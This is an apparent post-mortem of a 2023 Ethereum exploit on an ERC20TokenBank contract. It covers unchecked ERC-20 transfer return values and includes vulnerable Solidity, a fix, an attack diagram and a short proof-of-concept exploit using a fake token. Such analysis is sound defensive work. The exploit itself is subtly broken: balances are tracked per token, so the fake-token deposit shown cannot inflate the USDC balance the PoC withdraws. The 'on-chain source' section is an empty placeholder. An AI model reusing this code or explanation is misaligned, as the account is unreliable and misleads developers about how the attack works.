# ERC20TokenBank — Unchecked Token Transfer Return Value Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-08 |
| **Protocol** | ERC20TokenBank |
| **Chain** | Ethereum |
| **Loss** | ~111K USD |
| **Attacker** | [0xc0ffeebabe...](https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671) |
| **Attack Tx** | [0x578a195e...](https://etherscan.io/tx/0x578a195e05f04b19fd8af6358dc6407aa1add87c3167f053beb990d6b4735f26) |
| **Vulnerable Contract** | [0x765b8d7c...](https://etherscan.io/address/0x765b8d7cd8ff304f796f4b6fb1bcf78698333f6d) |
| **Root Cause** | Balance updated without validating return value after token transfer |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/ERC20TokenBank_exp.sol) |

---
## 1. Vulnerability Overview

The ERC20TokenBank contract is a simple banking contract for depositing and borrowing tokens. It does not check the return value after calling `transfer()`/`transferFrom()`, meaning internal balances are updated even when a transfer fails or returns `false` without reverting. The attacker exploited this to inflate their balance without actually depositing tokens, then executed a borrow.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: return value of transfer not checked
function deposit(address token, uint256 amount) external {
    // ❌ Ignored even if transferFrom returns false
    IERC20(token).transferFrom(msg.sender, address(this), amount);
    balances[msg.sender][token] += amount;  // Balance increases even if transfer failed
}

function withdraw(address token, uint256 amount) external {
    require(balances[msg.sender][token] >= amount, "Insufficient");
    balances[msg.sender][token] -= amount;
    // ❌ Return value not checked here either
    IERC20(token).transfer(msg.sender, amount);
}

// ✅ Fix: Use SafeERC20
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

function deposit(address token, uint256 amount) external {
    uint256 before = IERC20(token).balanceOf(address(this));
    SafeERC20.safeTransferFrom(IERC20(token), msg.sender, address(this), amount);
    uint256 actual = IERC20(token).balanceOf(address(this)) - before;
    balances[msg.sender][token] += actual;  // ✅ Use actually received amount
}
```

### On-chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: balance updated without validating return value after token transfer
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ deposit(fakeToken, largeAmount)
  │       transferFrom returns false (or no-op)
  │       ❌ Balance increases by largeAmount
  │
  ├─2─▶ withdraw(realToken, largeAmount)
  │       balances[attacker][realToken] >= largeAmount ✓ (inflated balance)
  │       Successfully withdraws actual realToken
  │
  └─3─▶ ~111K USD drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract FakeToken {
    // transferFrom always returns false (or does nothing)
    function transferFrom(address, address, uint256) external returns (bool) {
        return false;  // ❌ Transfer fails but return value is ignored
    }
}

function testExploit() public {
    FakeToken fakeToken = new FakeToken();

    // 1. Deposit with fake token (no actual transfer occurs)
    // ERC20TokenBank does not check return value, so balance is inflated
    bank.deposit(address(fakeToken), 1_000_000 ether);

    // 2. Withdraw a genuinely valuable token
    // balances[attacker][realToken] is inflated, withdrawal succeeds
    bank.withdraw(address(USDC), bank.balances(address(this), address(USDC)));
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unchecked Return Value |
| **Attack Vector** | Fake ERC-20 token + ignored return value |
| **Impact Scope** | Entire token bank balance |
| **DASP Classification** | Unchecked Return Values |
| **CWE** | CWE-252: Unchecked Return Value |

## 6. Remediation Recommendations

1. **Use SafeERC20**: Use OpenZeppelin's `safeTransfer` and `safeTransferFrom`.
2. **Measure actual balance delta**: Calculate the truly received amount by diffing balances before and after the transfer.
3. **Token whitelist**: Block unknown ERC-20 tokens from being accepted.

## 7. Lessons Learned

- Failing to validate the return value of ERC-20 `transfer`/`transferFrom` is a vulnerability known since the early days of Ethereum.
- SafeERC20 is the standard library that fully addresses this problem.
- Even in 2023, this basic mistake led to a $111K loss.